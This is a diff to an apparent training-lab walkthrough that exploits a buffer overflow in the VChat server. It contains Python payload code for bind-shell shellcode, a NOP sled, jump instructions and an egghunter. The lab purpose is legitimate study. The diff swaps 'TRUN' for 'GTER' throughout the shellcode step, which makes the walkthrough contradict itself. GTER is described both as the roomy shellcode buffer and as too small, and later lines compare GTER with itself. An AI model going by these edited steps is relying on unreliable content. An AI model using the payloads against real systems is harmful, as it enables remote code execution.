@@ -69,8 +69,6 @@ Compile VChat and its dependencies if they have not already been compiled. This 
 </details>
 	
 ## Exploit Process
-The following sections cover the process that should (Or may) be followed when performing this exploitation on the VChat application. It should be noted that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumptions primarily that we have access to the binary that may not be realistic; however, the enumeration and exploitation of generic Windows and Linux servers in order to procure this falls out of the scope of this document.
-
 
 ### Information Collecting
 We want to understand the VChat program and how it works in order to effectively exploit it. Before diving into the specific of how VChat behaves the most important information for us is the IP address of the Windows VM that runs VChat and the port number that VChat runs on.
@@ -102,11 +100,12 @@ We want to understand the VChat program and how it works in order to effectively
 
 		<img src="Images/Telnet.png" width=480>
 
-4. **Linux**: We can try a few inputs to the *TRUN* command and see if we can get any information. Type *TRUN* followed by some additional input as shown below
+4. **Linux**: We can try a few inputs to the *GTER* command and see if we can get any information. Type *GTER* followed by some additional input as shown below
 
 	<img src="Images/Telnet2.png" width=480>
 
    * Now, trying every possible combination of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process, as discussed later in the exploitation section.
+
 ### Dynamic Analysis
 This exploitation phase is where we launch the target application or binary and examine its behavior based on the input we provide. We can do this both using automated fuzzing tools and manually generated inputs. We do this to discover how we can construct a payload to modify VChat's behavior. We want to construct an attack string as follows: `padding-bytes|address-to-overwrite-return-address|shell-code`, where | means concatenation. Therefore, we need to know how many bytes are required in order to properly pad and align our overflow to overwrite critical sections of data.
 #### Launch VChat
@@ -397,12 +396,12 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 	```
 3. Generate shellcode packet (Python). Due to the structure of the VChat server and how it handles connections, our packet containing the *bind* shellcode is a bit more complicated.
    * In some walkthroughs, they do not perform any additional overflows. This is because the original Vulnserver contains memory leaks of sufficient size, where the received data is allocated on the heap and **is not** de-allocated with a `free()` call.
-   * In VChat, the sufficiently sized heap allocations are de-allocated. Therefore, we need to perform an overflow in the **TRUN** buffer, which can hold the shellcode and prevent the thread handling the **TRUN** message from exiting and de-allocating our shellcode.
+   * In VChat, the sufficiently sized heap allocations are de-allocated. Therefore, we need to perform an overflow in the **GTER** buffer, which can hold the shellcode and prevent the thread handling the **GTER** message from exiting and de-allocating our shellcode.
    * We will perform an overflow as is done in the [TURN exploitation](https://github.com/DaintyJet/VChat_TURN); however, we will add two `JMP` instructions and a [NOP Sled](https://unprotect.it/technique/nop-sled/). The NOP Sled allows us to jump to an arbitrary location in the buffer and fall down into the `JMP` instruction placed before the return address, allowing us to easily create an infinite loop that prevents de-allocation.
    * We can pick an arbitrary location in the buffer to jump to and assemble the instruction as done in `step 1` of the exploitation procedure.
 	```py
 	PAYLOAD_SHELL = (
-    	b'TRUN /.:/' +                        # TRUN command of the server
+    	b'GTER /.:/' +                        # GTER command of the server
     	SHELL +                               # Shell code
     	b'\x90' * (2003 - (len(SHELL) + 5)) + # Padding! We have the shellcode and 5 bytes of the jump we account for
 
@@ -414,7 +413,7 @@ Up until this point in time,  we have been performing [Denial of Service](https:
     	b'\xe9\x30\xff\xff\xff'        # Jump into NOP sled
 	)
 	```
-     * `b'TRUN /.:/'`: We are targeting the **TRUN** buffer as this has the space we need for the tcp-bind shellcode and the infinite-loop code.
+     * `b'GTER /.:/'`: We are targeting the **GTER** buffer as this has the space we need for the tcp-bind shellcode and the infinite-loop code.
      * `SHELL`: The Shellcode is placed in the buffer. This can be done anywhere, but placing it at the front allows us to avoid accidentally jumping into it.
      * `b'\x90' * (2003 - (len(SHELL) + 5))`: Create a NOP Sled; we do not want to overshoot the return address, so we need to account for the length of the shellcode, and the 5-byte instruction for the `JMP` we will perform.
      * `b'\xe9\x30\xff\xff\xff'`: This is one of the two `JMP` instructions, this is placed before the return address to prevent us from executing the address as an instruction which may lead to a crashed system state.
@@ -437,8 +436,8 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 	```
       * `b'GTER /.:/'`: We are overflowing the buffer of the **GTER** command.
       * `EGGHUNTER`: Remember that there is not enough space after the return address for the EggHunter shellcode. So we need to place it at the beginning of the buffer (after the command instruction!).
-      * `b'A' * (143 - len(EGGHUNTER))`We need to overflow up but not including to the return address so we can overwrite it, this can be `A`'s as we used here or the NOP (`\x90`) instruction as used for the **TRUN** overflow in ```step 5```. Since we have space taken up by the eggHunter's shellcode we do not want to overshoot our target and must take that into account!
-      * `struct.pack('<L', 0x625014dd)`: A `JMP ESP` address, this is one of the ones we had discovered with the mona.py command `!mona jmp -r esp -cp nonull -o` in Immunity Debugger. *Notice* that it differs from the one we used in the **TRUN** instruction! This is only done so we can observe the two packets more easily by setting breakpoints on two unique `JMP ESP` instructions.
+      * `b'A' * (143 - len(EGGHUNTER))`We need to overflow up but not including to the return address so we can overwrite it, this can be `A`'s as we used here or the NOP (`\x90`) instruction as used for the **GTER** overflow in ```step 5```. Since we have space taken up by the eggHunter's shellcode we do not want to overshoot our target and must take that into account!
+      * `struct.pack('<L', 0x625014dd)`: A `JMP ESP` address, this is one of the ones we had discovered with the mona.py command `!mona jmp -r esp -cp nonull -o` in Immunity Debugger. *Notice* that it differs from the one we used in the **GTER** instruction! This is only done so we can observe the two packets more easily by setting breakpoints on two unique `JMP ESP` instructions.
       * `b'\xe9\x66\xff\xff\xff'`: This is the only `JMP` instruction we use in the **GTER** overflow, this is placed after the return address so once we take control of the thread when the `JMP ESP` instruction is executed and we enter the start of the **GTER** buffer to begin executing the eggHunter Shellcode.
       * `b'C' * (400 - 147 - 4 - 5)`: Final padding (May be omitted)
 > [!IMPORTANT]
